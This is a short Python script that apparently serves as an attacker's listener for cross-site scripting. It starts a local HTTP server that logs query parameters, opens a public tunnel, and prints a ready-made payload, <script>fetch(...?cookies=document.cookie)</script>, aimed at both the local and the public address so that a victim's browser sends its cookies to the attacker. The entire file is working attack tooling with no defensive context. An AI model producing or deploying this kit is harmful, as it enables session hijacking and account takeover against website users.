from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import publicurl
import time

class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        """Handle GET requests"""
        parsed_url = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        print("\n---- GET Request ----")
        print(f"Path: \033[32m{self.path}\033[0m")
        print(f"Headers:\n{self.headers}")
        print(f"Query Parameters: \033[31m{query_params}\033[0m")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"GET request received and logged.")

def run(server_class=HTTPServer, handler_class=RequestHandler, port=4545):
    """Run the HTTP server"""
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print("localhost js query ::: \033[31m<script>fetch(`http://127.0.0.1:4545?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
    publicurl.create_public_connection()
    time.sleep(7)
    k = publicurl.get_public_url()
    k=k.replace(" ","")
    print("public js query ::: \033[31m<script>fetch(`"+k+"?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
    print("Server running....")
    httpd.serve_forever()

if __name__ == '__main__':
    run()

